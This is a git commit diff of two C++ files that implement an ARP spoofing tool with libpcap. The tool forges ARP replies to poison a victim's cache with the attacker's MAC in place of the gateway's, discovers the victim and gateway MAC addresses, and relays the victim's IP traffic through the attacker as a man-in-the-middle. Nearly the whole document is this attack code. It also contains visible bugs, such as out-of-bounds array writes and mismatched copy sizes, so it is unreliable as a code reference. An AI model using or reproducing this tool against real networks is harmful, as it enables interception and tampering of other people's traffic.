6f03099bc76fc885ce432f21d4ef67cce466300b
bokyoung <insecurity22@naver.com>
2017-05-20 17:43:50 +0900

    Update Arp_spoofing.cpp

--- Arp_spoofing.cpp
+++ Arp_spoofing.cpp
@@ -8,7 +8,9 @@
 #include <errno.h>
 #include <unistd.h>
 #include <netinet/in.h>
+#include <netinet/ether.h>
 #include <arpa/inet.h>
+#include <pthread.h>
 
 #include <sys/socket.h>
 #include <sys/types.h>
@@ -20,6 +22,7 @@ using namespace std;
 
 #define PROMISCUOUS 1
 #define	ETHERTYPE_ARP		0x0806
+#define	ETHERTYPE_IP		0x0800
 
     struct ether_arp_hdr
     {
@@ -40,202 +43,212 @@ using namespace std;
 
     };
 
+    struct ether_arp_hdr *eth_arp_hdr;
+    struct ifreq ifr;
+
+
  char change_mac(char mac[], unsigned char *packet) {
 
-     sscanf(mac, "%x:%x:%x:%x:%x:%x", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
+     sscanf(mac, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
  }
 
+ int get_my_mac(char *dev, unsigned char *packet) {
+
+     int fd;
+     fd = socket(AF_INET, SOCK_DGRAM, 0);
+     if(fd < 0) {
+         cout << "Socket error" << endl;
+         return -1;
+     }
+
+     strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
+     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
+         cout << "Mac error" << endl;
+         return -1;
+     }
+
+     for(int i=0; i<6; i++) {
+         packet[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
+     }
+ }
+
+ int put_ip(char argv[], unsigned char *packet) {
+
+     sockaddr_in addr;
+     addr.sin_addr.s_addr = inet_addr(argv);
+     memcpy(packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
+
+ }
+
+ int arp_packet(int op) {
+
+     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
+     eth_arp_hdr->ar_hrd = htons(0x0001);
+     eth_arp_hdr->ar_pro = htons(0x0800);
+     eth_arp_hdr->ar_hln = 0x06;
+     eth_arp_hdr->ar_pln = 0x04;
+     eth_arp_hdr->ar_op = htons(op);
+
+ }
+
+ int arp_infection_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
+
+     change_mac(victim_mac, eth_arp_hdr->h_dest);
+     get_my_mac(dev, eth_arp_hdr->h_source);
+
+     // ARP reply
+     arp_packet(0x0002);
+
+     get_my_mac(dev, eth_arp_hdr->__ar_sha);
+     put_ip(gateway_ip, eth_arp_hdr->__ar_sip);
+     change_mac(dev, eth_arp_hdr->__ar_tha);
+     put_ip(victim_ip, eth_arp_hdr->__ar_tip);
+
+     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
+              cout << "Error send infaction packet" << endl;
+              return -1;
+     }
+     else cout << "Send infaction packet" << endl;
+ }
+
+ int arp_request(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
+
+    // Attacker -> Target
+     memset(eth_arp_hdr->h_dest, 0xff, 6);
+     get_my_mac(dev, eth_arp_hdr->h_source);
+
+     // Arp request
+     arp_packet(0x0001);
+
+     get_my_mac(dev, eth_arp_hdr->__ar_sha);
+     put_ip(victim_ip, eth_arp_hdr->__ar_sip);
+     memset(eth_arp_hdr->__ar_tha, 0xff, 6);
+     put_ip(gateway_ip, eth_arp_hdr->__ar_tip);
+
+     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
+              cout << "Error arp request packet" << endl;
+              return -1;
+     }
+     else cout << "Send arp request packet" << endl;
+ }
+
+ int relay_ip_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
+
+     struct ethhdr *ep;
+     struct pcap_pkthdr *pkthdr;
+     const u_char *packet;
+     int res;
+
+     while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
+
+         if(res == 0) continue;
+         if(res < 0) {
+             cout << "Error reading the packets" << pcap_geterr(pcd);
+             exit(1);
+         }
+
+         ep = (struct ethhdr*)packet; // Get packet
+
+
+
+        /* // Attacker -> Victim
+         get_my_mac(dev, eth_arp_hdr->h_source);
+         change_mac(victim_ip, eth_arp_hdr->h_dest);
+
+         // (Src)Victim -> (Dst)Attacker, Get victim packet.
+         if((memcmp(ep->h_source, eth_arp_hdr->h_source, sizeof(ep->h_source)))
+                 && memcmp(ep->h_dest, eth_arp_hdr->h_dest, sizeof(ep->h_dest))) {
+
+             // (Src)Attacker -> (Dst)Gateway, Send victim packet
+             change_mac(gateway_ip, ep->h_dest);
+             get_my_mac(dev, ep->h_source);
+
+             if(pcap_sendpacket(pcd, (const u_char*)ep, 42) != 0) {
+                      cout << "Error relay packet" << endl;
+                      return -1;
+             }
+             else cout << "Send relay packet" << endl;
+         }*/
+         break;
+    }
+
+ }
+
+ typedef struct {
+
+     char *argv[];
+     pcap_t *pcd;
+
+ }thread_args;
+
+ void *infection_thread(void *thr) {
+
+     thread_args *args = (thread_args *)thr;
+     char *dev = args->argv[1];
+     char *gateway_ip = args->argv[2];
+     char *victim_ip = args->argv[3];
+     char *victim_mac = args->argv[4];
+     pcap_t *pcd = args->pcd;
+
+     arp_infection_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);
+
+ }
+
+ void *relay_thread(void *thr) {
+
+     thread_args *args = (thread_args *)thr;
+     char *dev = args->argv[1];
+     char *gateway_ip = args->argv[2];
+     char *victim_ip = args->argv[3];
+     char *victim_mac = args->argv[4];
+     pcap_t *pcd = args->pcd;
+
+     arp_request(dev, gateway_ip, victim_ip, victim_mac, pcd);
+     sleep(1);
+     relay_ip_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);
+
+ }
 
 int main(int argc, char *argv[])
 {
-    pcap_t *pcd; // packet captuer descripter
-    ether_arp_hdr *eth_arp_hdr;
-    eth_arp_hdr = new ether_arp_hdr;
-
-
-    if (argc != 8) {
+    if (argc != 5) {
         cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac ip_network_address";
         return -1;
     }
-
 
     char *dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
     cout << endl << "Device : " << dev << endl << endl;
 
-
+    pcap_t *pcd; // packet captuer descripter
     if ((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 500, errbuf)) == NULL) {
         cout << "Unable to open the Adapter.";
         return -1;
     }
 
-    // =========================================================
+    eth_arp_hdr = new ether_arp_hdr;
 
-    cout << "Ethernet Destination : " << endl;
-    change_mac(argv[5], eth_arp_hdr->h_dest);
+    pthread_t t1, t2;
+    thread_args thr;
 
-    // =========================================================
-    cout << "Ethernet Source : " << endl;
-    int fd;
-    fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if(fd < 0) {
-        cout << "socket error" << endl;
-        return -1;
+    thr.argv[1] = argv[1];
+    thr.argv[2] = argv[2];
+    thr.argv[3] = argv[3];
+    thr.argv[4] = argv[4];
+    thr.pcd = pcd;
+
+    struct ethhdr *ep;
+    struct pcap_pkthdr *pkthdr;
+    const u_char *packet;
+    int res;
+
+
+
+    while(1) {
+        pthread_create(&t1, NULL, infection_thread, &thr);
+        pthread_create(&t2, NULL, relay_thread, &thr);
+            cout << endl << " --------------- " << endl;
+            sleep(3);
+
     }
-
-    struct ifreq ifr;
-    struct sockaddr_in *sin;
-
-    strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
-    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
-        cout << "Mac error" << endl;
-        return -1;
-    }
-
-    cout << "-- My Mac address : ";
-    for(int i=0; i<6; i++) {
-    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
-    eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
-    }
-
-    // =========================================================
-
-    cout << endl << "Sender ip : " << endl;
-    sockaddr_in addr;
-    addr.sin_addr.s_addr = inet_addr(argv[2]);
-    memcpy(&eth_arp_hdr->__ar_sip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
-
-    // =========================================================
-
-    eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
-    cout << "ether-type : " << eth_arp_hdr->h_proto << endl << endl;
-
-    // ARP data
-    eth_arp_hdr->ar_hrd = htons(0x0001);
-    cout << "ar_hdr : " << eth_arp_hdr->ar_hrd << endl;
-    eth_arp_hdr->ar_pro = htons(0x0800);
-    cout << "ar_pro : " << eth_arp_hdr->ar_pro << endl;
-    eth_arp_hdr->ar_hln = 0x06;
-    cout << "ar_hln : " << eth_arp_hdr->ar_hln << endl;
-    eth_arp_hdr->ar_pln = 0x04;
-    cout << "ar_pln : " << eth_arp_hdr->ar_pln << endl;
-    eth_arp_hdr->ar_op = htons(0x0002);
-    cout << "ar_op : " << eth_arp_hdr->ar_op << endl << endl;
-
-    // =========================================================
-
-    cout << "Sender mac : ";
-    for(int i=0; i<6; i++) {
-    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
-    eth_arp_hdr->__ar_sha[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
-    }
-
-    cout << endl << "Target mac : " << endl;
-    change_mac(argv[5], eth_arp_hdr->__ar_tha);
-
-    // =========================================================
-
-    cout << "Target ip : " << eth_arp_hdr->__ar_tip;
-    addr.sin_addr.s_addr = inet_addr(argv[3]);
-    memcpy(&eth_arp_hdr->__ar_tip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
-
-    // =========================================================
-
-    if (pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-        cout << "Error packet" << endl;
-        return -1;
-    }
-    else cout << endl << endl << "Reply Good" << endl;
-
-
-
-
-
-
-
-
-
-    // Reply --------------------------------------- End
-
-
-    cout << "Request Ethernet Destination : " << endl;
-    change_mac(argv[7], eth_arp_hdr->h_dest);
-
-    // -------------------
-
-    cout << "Request Ethernet Source : " << endl;
-    fd = socket(AF_INET, SOCK_DGRAM, 0);
-    if(fd < 0) {
-        cout << "socket error" << endl;
-        return -1;
-    }
-
-    strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
-    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
-        cout << "Mac error" << endl;
-        return -1;
-    }
-
-    cout << "-- My Mac address : ";
-    for(int i=0; i<6; i++) {
-    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
-    eth_arp_hdr->h_source[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
-    }
-
-    // -------------
-
-    eth_arp_hdr->ar_op = htons(0x0001);
-    cout << "ar_op : " << eth_arp_hdr->ar_op << endl << endl;
-
-    // --------------
-
-    cout << "Sender mac : ";
-    for(int i=0; i<6; i++) {
-    cout << (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i] << " ";
-    eth_arp_hdr->__ar_sha[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
-    }
-
-    cout << endl << "Sender ip : " << endl;
-    addr.sin_addr.s_addr = inet_addr(argv[3]);
-    memcpy(&eth_arp_hdr->__ar_sip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
-
-
-    cout << endl << "Target mac : " << endl;
-    memset(eth_arp_hdr->__ar_tha, 0, sizeof(eth_arp_hdr->__ar_tha));
-    change_mac(argv[7], eth_arp_hdr->__ar_tha);
-
-
-    cout << "Target ip : " << eth_arp_hdr->__ar_tip;
-    addr.sin_addr.s_addr = inet_addr(argv[2]);
-    memcpy(&eth_arp_hdr->__ar_tip, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
-
-
-
-    if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-            cout << "Error packet" << endl;
-            return -1;
-    }
-    else cout << endl << endl << "Request Good" << endl;
-
-
 }
-
-
-
-
-
-/*
-
-    FILE *fp;
-    char buff[1024];
-
-    fp = popen("ifconfig", "r");
-    if(fp == NULL) return -1;
-    while(fgets(buff, sizeof(buff), fp)) { printf("--%s", buff); }
-    pclose(fp);
-
-    regex rx("HWaddr ([^ ])*");
-    printf("%s", rx);
-
- */
-
--- Arp_spoofing2.cpp
+++ Arp_spoofing2.cpp
@@ -9,246 +9,304 @@
 #include <unistd.h>
 #include <netinet/in.h>
 #include <netinet/ether.h>
+#include <netinet/ip.h>
 #include <arpa/inet.h>
-#include <pthread.h>
 
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <net/if.h>
 #include <sys/stat.h>
 #include <sys/ioctl.h>
+#include <thread>
+
 
 using namespace std;
 
 #define PROMISCUOUS 1
-#define	ETHERTYPE_ARP		0x0806
-#define	ETHERTYPE_IP		0x0800
 
-    struct ether_arp_hdr
-    {
-          unsigned char   	h_dest[6];	/* destination eth addr	*/
-          unsigned char   	h_source[6];	/* source ether addr	*/
-          unsigned short    h_proto;		/* packet type ID field	*/
+struct ether_arp_hdr {
 
-          unsigned short int ar_hrd;		/* Format of hardware address.  */
-          unsigned short int ar_pro;		/* Format of protocol address.  */
-          unsigned char ar_hln;		/* Length of hardware address.  */
-          unsigned char ar_pln;		/* Length of protocol address.  */
-          unsigned short int ar_op;		/* ARP opcode (command).  */
+    unsigned char   	h_dest[6];	/* destination eth addr	*/
+    unsigned char   	h_source[6];	/* source ether addr	*/
+    unsigned short    h_proto;		/* packet type ID field	*/
 
-          unsigned char __ar_sha[6];	/* Sender hardware address.  */
-          unsigned char __ar_sip[4];		/* Sender IP address.  */
-          unsigned char __ar_tha[6];	/* Target hardware address.  */
-          unsigned char __ar_tip[4];		/* Target IP address.  */
+    unsigned short int ar_hrd;		/* Format of hardware address.  */
+    unsigned short int ar_pro;		/* Format of protocol address.  */
+    unsigned char ar_hln;		/* Length of hardware address.  */
+    unsigned char ar_pln;		/* Length of protocol address.  */
+    unsigned short int ar_op;		/* ARP opcode (command).  */
 
-    };
+    unsigned char __ar_sha[6];	/* Sender hardware address.  */
+    unsigned char __ar_sip[4];		/* Sender IP address.  */
+    unsigned char __ar_tha[6];	/* Target hardware address.  */
+    unsigned char __ar_tip[4];		/* Target IP address.  */
 
-    struct ether_arp_hdr *eth_arp_hdr;
-    struct ifreq ifr;
+};
 
+struct ether_ip_hdr {
 
- char change_mac(char mac[], unsigned char *packet) {
+    unsigned char   	h_dest[6];	/* destination eth addr	*/
+    unsigned char   	h_source[6];	/* source ether addr	*/
+    unsigned short      h_proto;		/* packet type ID field	*/
 
-     sscanf(mac, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &packet[0], &packet[1], &packet[2], &packet[3], &packet[4], &packet[5]);
- }
+    unsigned int ihl:4;
+    unsigned int version:4;
 
- int get_my_mac(char *dev, unsigned char *packet) {
+    u_int8_t tos;
+    u_int16_t tot_len;
+    u_int16_t id;
+    u_int16_t frag_off;
+    u_int8_t ttl;
+    u_int8_t protocol;
+    u_int16_t check;
+    u_int32_t saddr;
+    u_int32_t daddr;
 
-     int fd;
-     fd = socket(AF_INET, SOCK_DGRAM, 0);
-     if(fd < 0) {
-         cout << "Socket error" << endl;
-         return -1;
-     }
+};
 
-     strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
-     if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
-         cout << "Mac error" << endl;
-         return -1;
-     }
+struct ifreq ifr;
 
-     for(int i=0; i<6; i++) {
-         packet[i] = (int)ifr.ifr_ifru.ifru_hwaddr.sa_data[i];
-     }
- }
+int get_my_mac(char *dev, char *packet) {
 
- int put_ip(char argv[], unsigned char *packet) {
-
-     sockaddr_in addr;
-     addr.sin_addr.s_addr = inet_addr(argv);
-     memcpy(packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
-
- }
-
- int arp_packet(int op) {
-
-     eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
-     eth_arp_hdr->ar_hrd = htons(0x0001);
-     eth_arp_hdr->ar_pro = htons(0x0800);
-     eth_arp_hdr->ar_hln = 0x06;
-     eth_arp_hdr->ar_pln = 0x04;
-     eth_arp_hdr->ar_op = htons(op);
-
- }
-
- int arp_infection_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
-
-     change_mac(victim_mac, eth_arp_hdr->h_dest);
-     get_my_mac(dev, eth_arp_hdr->h_source);
-
-     // ARP reply
-     arp_packet(0x0002);
-
-     get_my_mac(dev, eth_arp_hdr->__ar_sha);
-     put_ip(gateway_ip, eth_arp_hdr->__ar_sip);
-     change_mac(dev, eth_arp_hdr->__ar_tha);
-     put_ip(victim_ip, eth_arp_hdr->__ar_tip);
-
-     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-              cout << "Error send infaction packet" << endl;
-              return -1;
-     }
-     else cout << "Send infaction packet" << endl;
- }
-
- int arp_request(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
-
-    // Attacker -> Target
-     memset(eth_arp_hdr->h_dest, 0xff, 6);
-     get_my_mac(dev, eth_arp_hdr->h_source);
-
-     // Arp request
-     arp_packet(0x0001);
-
-     get_my_mac(dev, eth_arp_hdr->__ar_sha);
-     put_ip(victim_ip, eth_arp_hdr->__ar_sip);
-     memset(eth_arp_hdr->__ar_tha, 0xff, 6);
-     put_ip(gateway_ip, eth_arp_hdr->__ar_tip);
-
-     if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
-              cout << "Error arp request packet" << endl;
-              return -1;
-     }
-     else cout << "Send arp request packet" << endl;
- }
-
- int relay_ip_packet(char dev[], char gateway_ip[], char victim_ip[], char victim_mac[], pcap_t *pcd) {
-
-     struct ethhdr *ep;
-     struct pcap_pkthdr *pkthdr;
-     const u_char *packet;
-     int res;
-
-     while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
-
-         if(res == 0) continue;
-         if(res < 0) {
-             cout << "Error reading the packets" << pcap_geterr(pcd);
-             exit(1);
-         }
-
-         ep = (struct ethhdr*)packet; // Get packet
-
-
-
-        /* // Attacker -> Victim
-         get_my_mac(dev, eth_arp_hdr->h_source);
-         change_mac(victim_ip, eth_arp_hdr->h_dest);
-
-         // (Src)Victim -> (Dst)Attacker, Get victim packet.
-         if((memcmp(ep->h_source, eth_arp_hdr->h_source, sizeof(ep->h_source)))
-                 && memcmp(ep->h_dest, eth_arp_hdr->h_dest, sizeof(ep->h_dest))) {
-
-             // (Src)Attacker -> (Dst)Gateway, Send victim packet
-             change_mac(gateway_ip, ep->h_dest);
-             get_my_mac(dev, ep->h_source);
-
-             if(pcap_sendpacket(pcd, (const u_char*)ep, 42) != 0) {
-                      cout << "Error relay packet" << endl;
-                      return -1;
-             }
-             else cout << "Send relay packet" << endl;
-         }*/
-         break;
-    }
-
- }
-
- typedef struct {
-
-     char *argv[];
-     pcap_t *pcd;
-
- }thread_args;
-
- void *infection_thread(void *thr) {
-
-     thread_args *args = (thread_args *)thr;
-     char *dev = args->argv[1];
-     char *gateway_ip = args->argv[2];
-     char *victim_ip = args->argv[3];
-     char *victim_mac = args->argv[4];
-     pcap_t *pcd = args->pcd;
-
-     arp_infection_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);
-
- }
-
- void *relay_thread(void *thr) {
-
-     thread_args *args = (thread_args *)thr;
-     char *dev = args->argv[1];
-     char *gateway_ip = args->argv[2];
-     char *victim_ip = args->argv[3];
-     char *victim_mac = args->argv[4];
-     pcap_t *pcd = args->pcd;
-
-     arp_request(dev, gateway_ip, victim_ip, victim_mac, pcd);
-     sleep(1);
-     relay_ip_packet(dev, gateway_ip, victim_ip, victim_mac, pcd);
-
- }
-
-int main(int argc, char *argv[])
-{
-    if (argc != 5) {
-        cout << "Usage : " << argv[0] << " Device Target_ip Sender_ip My_mac Sender_mac ip_network_address";
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if(fd < 0) {
+        cout << "Socket error" << endl;
         return -1;
     }
 
-    char *dev = argv[1];
+    strncpy(ifr.ifr_ifrn.ifrn_name, dev, strlen(dev));
+    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
+        cout << "get_may_mac error" << endl;
+        return -1;
+    }
+
+    memcpy(packet, ifr.ifr_ifru.ifru_hwaddr.sa_data, 6);
+
+    return 0;
+}
+
+int change_ip(char ip[], char *packet) {
+
+    sockaddr_in addr;
+    addr.sin_addr.s_addr = inet_addr(ip);
+    memcpy(packet, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr));
+
+    return 0;
+
+}
+
+struct ether_arp_hdr *eth_arp_hdr;
+
+int arp_packet(int op) {
+
+    eth_arp_hdr->h_proto = htons(ETHERTYPE_ARP);
+    eth_arp_hdr->ar_hrd = htons(0x0001);
+    eth_arp_hdr->ar_pro = htons(0x0800);
+    eth_arp_hdr->ar_hln = 0x06;
+    eth_arp_hdr->ar_pln = 0x04;
+    eth_arp_hdr->ar_op = htons(op);
+
+    return 0;
+
+}
+
+int send_request(pcap_t *pcd, char my_mac[6], char *gateway_ip, char *victim_ip) {
+
+    memcpy(eth_arp_hdr->h_source, my_mac, 6);
+    memset(eth_arp_hdr->h_dest, 0xff, 6);
+
+    arp_packet(0x0001);
+
+    memcpy(eth_arp_hdr->__ar_sha, my_mac, 6);
+    memcpy(eth_arp_hdr->__ar_sip, gateway_ip, 6);
+    memset(eth_arp_hdr->__ar_tha, 0x00, 6);
+    memcpy(eth_arp_hdr->__ar_tip, victim_ip, 6);
+
+    if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
+        cout << "Error arp request ( For get victim mac )" << endl;
+        return -1;
+    }
+    else cout << endl << "Send arp request for get victim mac" << endl;
+
+    return 0;
+}
+
+struct pcap_pkthdr *pkthdr;
+const u_char *packet;
+int res;
+
+int get_mac_and_ip(pcap_t *pcd, char *dev, char my_mac[6], char *target_ip, char *sender_ip, char get_ip[4], char get_mac[6]) {
+
+    // Victim <- Attacker
+    // Victim -> Attacker -> Gateway
+
+    while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
+           if(res == 0) continue;
+           if(res < 0) {
+               cout << "Error reading the packets" << pcap_geterr(pcd);
+               return -1;
+           }
+
+           eth_arp_hdr = (struct ether_arp_hdr*)packet;
+
+           if(eth_arp_hdr->h_proto == htons(ETHERTYPE_ARP)  // Come reply packet
+                   && memcmp(eth_arp_hdr->h_dest, my_mac, 6)==0
+                   && memcmp(eth_arp_hdr->__ar_tha, my_mac, 6)==0
+                   && memcmp(eth_arp_hdr->__ar_sip, sender_ip, 4)==0
+                   && memcmp(eth_arp_hdr->__ar_tip, target_ip, 4)==0) {
+
+
+               memcpy(get_mac, eth_arp_hdr->h_source, 6);
+               change_ip((char*)eth_arp_hdr->__ar_sip, get_ip);
+
+               cout << "Get ip and mac." << endl;
+               break;
+           }
+       }
+
+    return 0;
+}
+
+
+int arp_infection_packet(char *dev, pcap_t *pcd, char victim_mac[6], char my_mac[6], char *gateway_ip, char *victim_ip) {
+
+    // Attacker -> Victim
+    memcpy(eth_arp_hdr->h_dest, victim_mac, 6);
+    memcpy(eth_arp_hdr->h_source, my_mac, 6);
+
+    arp_packet(0x0002);
+
+    memcpy(eth_arp_hdr->__ar_sha, my_mac, 6);
+    memcpy(eth_arp_hdr->__ar_sip, gateway_ip, 4);
+    memcpy(eth_arp_hdr->__ar_tha, victim_mac, 6);
+    memcpy(eth_arp_hdr->__ar_tip, victim_ip, 4);
+
+    if(pcap_sendpacket(pcd, (const u_char*)eth_arp_hdr, 42) != 0) {
+        cout << "Error send infaction packet" << endl;
+        return -1;
+    }
+    else cout << endl << "Send infaction packet" << endl;
+
+    return 0;
+}
+
+int ip_relay_packet(pcap_t *pcd, char my_mac[6], char victim_mac[6], char *gateway_mac, char *victim_ip) {
+
+    // Victim -> Attacker -> Gateway
+
+    struct ether_ip_hdr *iph;
+    while((res = pcap_next_ex(pcd, &pkthdr, &packet)) >= 0) {
+
+        if(res == 0) continue;
+        if(res < 0) {
+            cout << "Error reading the packets" << pcap_geterr(pcd);
+            return -1;
+        }
+
+        iph = (struct ether_ip_hdr*)packet;
+
+        if(iph->h_proto == htons(ETHERTYPE_IP)
+                && iph->version == 0x4
+                && iph->ihl == 0x5
+                && memcmp(iph->h_dest, my_mac, 6)==0
+                && memcmp(iph->h_source, victim_mac, 6)==0) {
+
+            memcpy(iph->h_dest, gateway_mac, 6);
+            memcpy(iph->h_source, my_mac, 6);
+
+            if(pcap_sendpacket(pcd, (const u_char*)packet, 1500) != 0) {
+                cout << "Error relay packet" << endl;
+                return -1;
+            }
+            else cout << "Send relay packet" << endl;
+
+            break;
+        }
+    }
+    return 0;
+}
+
+
+typedef struct {
+    char *argv[];
+    pcap_t *pcd;
+    char *victim_mac[];
+    char my_mac[6];
+}thread_args;
+
+
+void *infection_thread(void *thr) {
+
+    thread_args *args = (thread_args *)thr;
+    pcap_t *pcd = args->pcd;
+    char *dev = args->argv[1];
+    char *gateway_ip = args->argv[2];
+    char *victim_ip = args->argv[3];
+    char *victim_mac = args->argv[4];
+    char my_mac = args->my_mac[6];
+
+    arp_infection_packet(dev, pcd, (char*)victim_mac, (char*)my_mac, gateway_ip, victim_ip);
+
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+
+    eth_arp_hdr = new ether_arp_hdr;
     char errbuf[PCAP_ERRBUF_SIZE];
+
+    char *dev = argv[1];
     cout << endl << "Device : " << dev << endl << endl;
 
-    pcap_t *pcd; // packet captuer descripter
-    if ((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 500, errbuf)) == NULL) {
+    char my_mac[6];
+    get_my_mac(dev, my_mac);
+
+    char *gateway_ip = argv[2];
+    change_ip(gateway_ip, gateway_ip);
+
+    char *victim_ip = argv[3];
+    change_ip(victim_ip, victim_ip);
+
+    // get
+    char get_victim_mac[6];
+    char get_gateway_mac[6];
+    char get_gateway_ip[4];
+
+    pcap_t *pcd;
+    if((pcd = pcap_open_live(dev, BUFSIZ, PROMISCUOUS, 1, errbuf)) == NULL) {
         cout << "Unable to open the Adapter.";
         return -1;
     }
 
-    eth_arp_hdr = new ether_arp_hdr;
 
-    pthread_t t1, t2;
+    pthread_t t1;
     thread_args thr;
 
     thr.argv[1] = argv[1];
     thr.argv[2] = argv[2];
     thr.argv[3] = argv[3];
-    thr.argv[4] = argv[4];
+    thr.my_mac[6] = my_mac[6];
     thr.pcd = pcd;
 
-    struct ethhdr *ep;
-    struct pcap_pkthdr *pkthdr;
-    const u_char *packet;
-    int res;
 
+    send_request(pcd, my_mac, gateway_ip, victim_ip);
+    get_mac_and_ip(pcd, dev, my_mac, gateway_ip, victim_ip, get_gateway_ip, get_victim_mac); // Get victim mac
 
+    cout << "*** Get victim mac" << endl;
+    sleep(1);
 
-    while(1) {
-        pthread_create(&t1, NULL, infection_thread, &thr);
-        pthread_create(&t2, NULL, relay_thread, &thr);
-            cout << endl << " --------------- " << endl;
-            sleep(3);
+    send_request(pcd, my_mac, victim_ip, gateway_ip);
+    get_mac_and_ip(pcd, dev, my_mac, victim_ip, gateway_ip, get_gateway_ip, get_gateway_mac); // Get gateway mac
+    sleep(1);
+    cout << "*** Get gateway mac" << endl << endl << "*** *** *** Start" << endl;
 
+    thr.argv[4] = get_victim_mac;
+
+    pthread_create(&t1, NULL, infection_thread, &thr);
+
+    while(1){
+
+        ip_relay_packet(pcd, my_mac, get_victim_mac, get_gateway_mac, victim_ip);
+        sleep(1);
     }
 }
